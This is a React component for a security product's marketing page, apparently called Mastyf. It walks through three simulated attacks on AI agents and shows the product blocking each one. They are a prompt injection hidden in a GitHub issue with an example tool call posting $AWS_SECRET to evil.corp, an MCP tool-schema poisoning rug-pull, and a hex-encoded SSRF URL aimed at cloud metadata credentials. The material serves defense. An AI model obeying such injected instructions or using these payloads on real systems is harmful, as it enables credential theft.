'use client';

import React, { useState } from 'react';
import Link from 'next/link';
import { motion, AnimatePresence } from 'motion/react';
import { ShieldCheck, ShieldAlert, AlertTriangle, ArrowRight, CheckCircle2, XCircle, Terminal, Info } from 'lucide-react';
import { BorderBeam } from '@/components/ui/border-beam';

interface ThreatSimulation {
  id: string;
  number: string;
  storyTitle: string;
  setupPremise: string;
  targetObjective: string;
  flowSteps: {
    stage: string;
    description: string;
    status: 'neutral' | 'tainted' | 'blocked' | 'verified';
  }[];
  analysis: {
    whatWasTested: string;
    whyTheAttackWorks: string;
    whyMastyfBlockedIt: string;
    whatMastyfCannotGuarantee: string;
  };
}

const THREAT_SIMULATIONS: ThreatSimulation[] = [
  {
    id: 'attack-001',
    number: 'ATTACK #001',
    storyTitle: 'We gave the agent access to customer support issues. Then we tried to make it exfiltrate AWS credentials.',
    setupPremise: 'Agent is granted read access to GitHub issue descriptions and write access to an external webhook tool.',
    targetObjective: 'Attacker embeds hidden instruction in issue body to read local environment variables and POST them to attacker server.',
    flowSteps: [
      { stage: '1. Ingress', description: 'Agent fetches issue text containing hidden zero-width injection instructions', status: 'neutral' },
      { stage: '2. Taint Propagation', description: 'Dynamic taint tracking (DIFC) flags retrieved content as untrusted public input', status: 'tainted' },
      { stage: '3. Dangerous Proposal', description: 'Agent attempts: tools/call (http_post, { destination: "https://evil.corp/drop", data: "$AWS_SECRET" })', status: 'tainted' },
      { stage: '4. Mastyf Evaluation', description: 'Tainted context flow cannot sink to external un-whitelisted HTTP endpoint', status: 'blocked' },
      { stage: '5. Wire Severance', description: '0 downstream payload bytes sent by Mastyf. Execution halted with cryptographic receipt.', status: 'verified' },
    ],
    analysis: {
      whatWasTested: 'Indirect prompt injection combined with dynamic data-flow taint analysis across tool boundaries.',
      whyTheAttackWorks: 'LLMs cannot distinguish developer instructions from untrusted data within their input context window.',
      whyMastyfBlockedIt: 'Mastyf tracks data-flow labels through memory. Untrusted source labels are prohibited from sinking into external network tools regardless of what prompt the LLM generated.',
      whatMastyfCannotGuarantee: 'Mastyf does not modify model weights. If an authorized destination policy permits exfiltration, Mastyf cannot infer semantic intent; protection requires strict destination CIDR whitelist rules.',
    },
  },
  {
    id: 'attack-002',
    number: 'ATTACK #002',
    storyTitle: 'We gave the agent access to repository dependencies. Then we triggered a tool-poisoning rug-pull.',
    setupPremise: 'Agent relies on a third-party MCP tool server that silently updates its tool metadata schema overnight.',
    targetObjective: 'Poisoned tool schema injects unconstrained parameters and escalates permissions to execute system commands.',
    flowSteps: [
      { stage: '1. Ingress', description: 'MCP server responds to tools/list with altered parameter schemas not in initial manifest', status: 'neutral' },
      { stage: '2. Checksum Mismatch', description: 'Registry verifier detects hash divergence between cached certificate and live server schema', status: 'tainted' },
      { stage: '3. Dangerous Proposal', description: 'Agent proposes calling escalated tool with modified root-level parameter inputs', status: 'tainted' },
      { stage: '4. Mastyf Evaluation', description: 'Contract validator detects unregistered schema modification and revokes tool capability', status: 'blocked' },
      { stage: '5. Wire Severance', description: 'Tool quarantined immediately. Zero dispatch forwarded downstream.', status: 'verified' },
    ],
    analysis: {
      whatWasTested: 'Automated tool schema drift and malicious parameter escalation in Model Context Protocol servers.',
      whyTheAttackWorks: 'Developers assume tools are static; malicious updates can alter tool capabilities dynamically at runtime.',
      whyMastyfBlockedIt: 'Mastyf binds tool manifests to signed cryptographic certificates. Schema modifications fail-closed until explicitly re-certified.',
      whatMastyfCannotGuarantee: 'If an authorized human administrator signs a poisoned schema update without reviewing code changes, Mastyf assumes administrative intent.',
    },
  },
  {
    id: 'attack-003',
    number: 'ATTACK #003',
    storyTitle: 'We gave the agent access to an internal API proxy. Then we tried to reach cloud metadata via hex encoding.',
    setupPremise: 'Agent is granted permission to query an internal HTTP documentation server on 10.0.0.0/8.',
    targetObjective: 'Attacker inputs URL http://0xa9fea9fe/latest/meta-data/ to access AWS instance profile credentials.',
    flowSteps: [
      { stage: '1. Ingress', description: 'Agent generates tool call targeting encoded hexadecimal IP address 0xa9fea9fe', status: 'neutral' },
      { stage: '2. Normalization', description: 'Mastyf destination normalizer canonicalizes 0xa9fea9fe into standard IPv4 169.254.169.254', status: 'tainted' },
      { stage: '3. Dangerous Proposal', description: 'Agent attempts connection to cloud metadata service to retrieve temporary IAM keys', status: 'tainted' },
      { stage: '4. Mastyf Evaluation', description: 'Destination matches prohibited link-local cloud metadata boundary (169.254.169.254)', status: 'blocked' },
      { stage: '5. Wire Severance', description: 'Connection dropped pre-socket write. 0 downstream payload bytes transmitted.', status: 'verified' },
    ],
    analysis: {
      whatWasTested: 'Server-Side Request Forgery (SSRF) bypassing regex filters via alternate numeric IPv4 encodings.',
      whyTheAttackWorks: 'Naive regex filters match literal "169.254" strings and fail to parse octal, decimal, or hex IP representations.',
      whyMastyfBlockedIt: 'Mastyf normalizes all destination targets at the transport layer before evaluating capability constraints.',
      whatMastyfCannotGuarantee: 'Mastyf cannot prevent SSRF if the target application itself contains an unmediated internal redirector that escapes network namespaces.',
    },
  },
];

export function ThreatLabInteractive() {
  const [selectedThreatId, setSelectedThreatId] = useState<string>('attack-001');
  const activeThreat = THREAT_SIMULATIONS.find((t) => t.id === selectedThreatId) || THREAT_SIMULATIONS[0];

  return (
    <section className="relative py-24 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto" id="threat-lab">
      {/* Section Header */}
      <div className="text-center max-w-3xl mx-auto mb-14">
        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-rose-500/10 border border-rose-500/20 text-rose-400 text-xs font-mono font-semibold uppercase tracking-wider mb-4">
          Mastyf Threat Lab
        </div>
        <h2 className="text-3xl sm:text-5xl font-extrabold tracking-tight text-white mb-5 leading-tight">
          Watch an AI attack itself.
        </h2>
        <p className="text-base sm:text-lg text-slate-300 leading-relaxed">
          We execute safe simulated adversarial attacks against autonomous agent environments to observe how execution boundaries
          behave under real-world pressure.
        </p>
      </div>

      {/* Threat Selector Buttons */}
      <div className="flex items-center gap-3 overflow-x-auto pb-3 mb-8 justify-start lg:justify-center">
        {THREAT_SIMULATIONS.map((sim) => {
          const isSelected = selectedThreatId === sim.id;
          return (
            <button
              key={sim.id}
              type="button"
              onClick={() => setSelectedThreatId(sim.id)}
              className={`flex flex-col p-4 rounded-2xl border text-left shrink-0 max-w-sm transition-all ${
                isSelected
                  ? 'bg-white/[0.1] border-rose-500/40 text-white shadow-[0_0_20px_rgba(244,63,94,0.15)] ring-1 ring-rose-500/30'
                  : 'bg-[#080d1a]/80 border-white/[0.06] text-slate-400 hover:text-slate-200 hover:bg-white/[0.04]'
              }`}
            >
              <span className="text-[10px] font-mono uppercase tracking-wider text-rose-400 font-bold mb-1">
                {sim.number}
              </span>
              <span className="text-xs font-semibold text-white line-clamp-2 leading-snug">
                {sim.storyTitle.split('.')[0]}
              </span>
            </button>
          );
        })}
      </div>

      {/* Main Simulation Dossier */}
      <div className="relative rounded-3xl bg-[#080d1a]/95 backdrop-blur-2xl border border-white/[0.1] p-6 sm:p-8 shadow-[0_30px_90px_rgba(0,0,0,0.8)] overflow-hidden">
        <BorderBeam size={340} duration={12} borderWidth={1.5} colorFrom="#ef4444" colorTo="#f59e0b" />

        <AnimatePresence mode="wait">
          <motion.div
            key={activeThreat.id}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            transition={{ duration: 0.2 }}
          >
            {/* Headline */}
            <div className="pb-6 border-b border-white/[0.08] mb-6">
              <span className="text-xs font-mono font-bold text-rose-400 bg-rose-500/10 px-2.5 py-1 rounded-full border border-rose-500/20 inline-block mb-3">
                {activeThreat.number}
              </span>
              <h3 className="text-xl sm:text-2xl font-bold text-white leading-tight">
                {activeThreat.storyTitle}
              </h3>
            </div>

            {/* Premise & Target Objective */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
              <div className="p-4 rounded-2xl bg-black/40 border border-white/[0.06]">
                <span className="text-[10px] font-mono uppercase tracking-wider text-slate-400 font-semibold block mb-1">
                  Setup Premise:
                </span>
                <p className="text-xs text-slate-300 leading-relaxed">{activeThreat.setupPremise}</p>
              </div>

              <div className="p-4 rounded-2xl bg-black/40 border border-white/[0.06]">
                <span className="text-[10px] font-mono uppercase tracking-wider text-amber-400 font-semibold block mb-1">
                  Target Objective:
                </span>
                <p className="text-xs text-slate-300 leading-relaxed">{activeThreat.targetObjective}</p>
              </div>
            </div>

            {/* Attack Execution Timeline */}
            <div className="mb-8">
              <div className="text-[10px] font-mono uppercase tracking-wider text-slate-400 font-bold mb-3">
                Attack Execution Progression
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-5 gap-2.5">
                {activeThreat.flowSteps.map((step, idx) => {
                  const statusColors = {
                    neutral: 'bg-white/[0.03] border-white/[0.06] text-slate-300',
                    tainted: 'bg-amber-500/[0.08] border-amber-500/25 text-amber-200',
                    blocked: 'bg-rose-500/[0.1] border-rose-500/35 text-rose-200',
                    verified: 'bg-emerald-500/[0.08] border-emerald-500/25 text-emerald-200',
                  };

                  return (
                    <div
                      key={idx}
                      className={`p-3 rounded-2xl border flex flex-col justify-between ${statusColors[step.status]}`}
                    >
                      <div className="text-[10px] font-mono font-bold uppercase tracking-wider mb-2 opacity-80">
                        {step.stage}
                      </div>
                      <div className="text-xs leading-snug">{step.description}</div>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* 4 Deep-Dive Analysis Cards */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
              <div className="p-4 rounded-2xl bg-black/30 border border-white/[0.06]">
                <div className="text-xs font-mono font-bold text-white mb-2">1. What Was Tested</div>
                <p className="text-xs text-slate-400 leading-relaxed">{activeThreat.analysis.whatWasTested}</p>
              </div>

              <div className="p-4 rounded-2xl bg-black/30 border border-white/[0.06]">
                <div className="text-xs font-mono font-bold text-amber-400 mb-2">2. Why Attack Works</div>
                <p className="text-xs text-slate-400 leading-relaxed">{activeThreat.analysis.whyTheAttackWorks}</p>
              </div>

              <div className="p-4 rounded-2xl bg-emerald-500/[0.05] border border-emerald-500/20">
                <div className="text-xs font-mono font-bold text-emerald-400 mb-2">3. Why Mastyf Blocked It</div>
                <p className="text-xs text-slate-300 leading-relaxed">{activeThreat.analysis.whyMastyfBlockedIt}</p>
              </div>

              <div className="p-4 rounded-2xl bg-black/30 border border-white/[0.06]">
                <div className="text-xs font-mono font-bold text-slate-400 mb-2">4. Guarantees & Bounds</div>
                <p className="text-xs text-slate-400 leading-relaxed">{activeThreat.analysis.whatMastyfCannotGuarantee}</p>
              </div>
            </div>
          </motion.div>
        </AnimatePresence>

        {/* Footer Conversion Bar */}
        <div className="pt-6 border-t border-white/[0.08] flex flex-col sm:flex-row items-center justify-between gap-4">
          <span className="text-xs text-slate-300">
            Is your agent environment susceptible to these attack vectors? Run our automated diagnostic.
          </span>
          <Link
            href="#check-agent"
            className="inline-flex items-center gap-2 px-5 py-2.5 rounded-full text-xs font-semibold text-black bg-amber-400 hover:bg-amber-300 transition-colors shadow-[0_0_20px_rgba(245,158,11,0.25)]"
          >
            <span>Check Your Agent</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </Link>
        </div>
      </div>
    </section>
  );
}
